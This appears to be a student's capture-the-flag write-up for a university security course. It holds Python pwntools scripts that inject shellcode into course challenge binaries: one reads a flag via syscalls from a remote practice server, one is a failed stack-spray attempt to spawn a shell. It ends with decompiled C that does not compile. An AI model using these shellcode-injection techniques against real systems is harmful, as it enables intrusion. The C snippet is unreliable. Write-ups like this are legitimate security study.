pwntools - CTF toolkit

# z5214048 war3

Simple 
===========================
Flag: COMP6447{trivial}


General overview of problems faced
-------------------------------------
Problem: What the hell is FD? How do I access it?
Soln: Wonders of Google + lovely syscalls.kernelgrok.com

Problem: Too hard to fix x86 errors
Soln: Keep trying?

Had to hack the program:
1. Try simple /bin/sh obtainer -> Fail (what a surprise)
2. Assume the program's output: Flag at FD 1000. Then read FD 1000, store somewhere relatively safe in memory, and then write output to stdout. 
2.1. Where to "store somewhere relatively safe in memory" -> Tried arbitrary code execution chunk of memory + some offset (I did 0x100), which equates to EIP+0x100
 


Script/Command used
------------------
1. Run the script (PY3 + Pwntools from Dev3 branch)
```
#!/usr/bin/python3

from binascii import unhexlify
from pwn import *

PROGRAM_NAME = "sh"
ENCODING = "ascii"
REMOTE = 0
OFFSET = 16

# https://stackoverflow.com/a/15704848
ROM_HELLO = b'\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f'

ROM_PWNHELLO = pwnlib.shellcraft.i386.linux.echo('pwny hello', 1)
ROM_MY = """
push 3
pop eax
        
push 0x3e8      
pop ebx

call get_eip
get_eip:
    pop ecx
add ecx, 0x100
push 0x32
pop edx
int    0x80           
	
push 4
pop eax
        
push 1
pop ebx        
int    0x80  
ret         
"""

  # pwnlib.shellcraft.i386.linux.readn(1000, 'eax', 'ebx')

rom = ROM_MY
#print(rom)
rom = asm(rom)

def io_beg():
	return remote('plzpwn.me', 3001)
	#process("./simple")
	#remote('plzpwn.me', 2000)
	#process('./jump')
	
def io_rdy(x):
	return x.recvuntil("enter your shellcode:".encode(ENCODING), timeout = 3).decode(ENCODING)

def main():
	print("**********WELCOME**********")
	stage = 0
	fin = 0
	
	while(fin < 1):
		if(stage == 0):
			io = io_beg()						
			io_rdy(io)
						
			print("1. Deploying ")
			io.send_raw(rom) # win
			print("2. Fire")
			io.sendline(b'') # fire!		
			
			io.interactive()
			
			stage = stage + 1
		else:
			print("Weird flex, exiting")
			fin = 1

if __name__ == '__main__':
	main()

```
-

shellz
===========================

Flag: not found

General overview of problems faced
-------------------------------------

Had to hack the program

## Old attempt
~~1. My idea was to fill in half of stack with NOPs, leading to get shell part, followed by a bunch of relative jmps back worth half the stack. Once the function executes "ret", it would jump to the stack and execute arbitrary code.
2. However, didn't work out, not sure why. "jmp -(half the stack)" fails to get compiled; I must be misunderstanding something in x86~~

% | Content (old)
---|---
50% | NOPs
1% | get shell
49% | jmp back somewhere in NOPs

## New attempt

After discussing with chat, I found out that if I need to arbitrarily jump back, I do it wrong. So I came up with the new idea,

Name | % | Content (new)
---|---|---
Part 1 | IDK, 2%? | "Get shell" assembly code
Part 2 | 1% | NOPs to leverage modulo of the addresses
Part 3 | 99% | p32() of beginning of the controlled stack address (the one told in the beginning)

So the idea is that one of the 99% content above4 will happen to be the return address popped from stack, which would lead to getting shell. It should work in theory, but it does not. Why? Because as far as I know (and from the statistical tests), there is no way to know how much data do I need to write,
* I write too little -> No effect
* I write too much -> Seg fault

Perhaps tomorrow it will be clear on how to do that correctly. In the meantime, I include the script I used for the new attempt

Script/Command used
------------------
1. Run the script (PY3 + Pwntools from Dev3 branch)
```
#!/usr/bin/python3

from binascii import unhexlify
from pwn import *
from math import *

PROGRAM_NAME = "sh"
ENCODING = "ascii"
REMOTE = 0
OFFSET = 16

def io_beg():
	return process("./shellz")
	#process("./simple")
	#remote('plzpwn.me', 2000)
	#process('./jump')
	
def io_rdy(x):
	return x.recvuntil("Here is a random stack address:".encode(ENCODING), timeout = 3).decode(ENCODING)

def main():
	print("**********WELCOME**********")
	stage = 0
	fin = 0
	
	while(fin < 1):
		if(stage == 0):
			print("Cooking")
			
			io = io_beg()						
			io_rdy(io)
			
			addr = io.recvline().decode(ENCODING)
			addr = addr.strip().split("x")[-1]
			
			addr_int = int(addr, 16)
			addr_mod4 = addr_int % 4
			
			print("addr: "+addr)
			print("addr_mod4: "+str(addr_mod4))
			
			
			stage = stage + 1
		elif(stage == 1):
			part1 = asm(shellcraft.i386.linux.sh())
			part1_len = len(part1)
			part1_mod4 = part1_len % 4
			print("part1_len & mod: "+str(part1_len)+" "+str(part1_mod4))
			
			part2_block =  asm(pwnlib.shellcraft.i386.nop())
			assert (len(part2_block) == 1)
			part2_len = ((part1_mod4+addr_mod4) % 4)+4
			part2 = part2_block*part2_len
			print("part2_len "+str(part2_len))
			
			part3_block = p32(addr_int)
			part3_len = 20000 # to be sure
			part3 = part3_block*part3_len
			
			stage = stage + 1
		elif(stage == 2):
			sleep(1)
			
			print("1. Deploying parts")
			print("* Part 1 ("+str(len(part1))+")")
			io.send_raw(part1) # win
			print("* Part 2 ("+str(len(part2))+")")
			io.send_raw(part2) # win
			print("* Part 3 ("+str(len(part3))+")")
			io.send_raw(part3) # win

			print("2. Fire")
			#io.sendline(b'') # fire!		
			
			io.interactive()
			
			stage = stage + 1
		else:
			print("Weird flex, exiting")
			fin = 1

if __name__ == '__main__':
	main()
```

Reverse engineering challenge 
================================

```C

int main(int argc, char *argv[])
{
    int buf;
    int c = 0;
    
    do()
    {
        buf = c % 2;
        if(buf > 0)
        {
            printf("%d", c);
        }
        c++;
        
    }
    while(c <= 9)
    
    return(1);
}


```
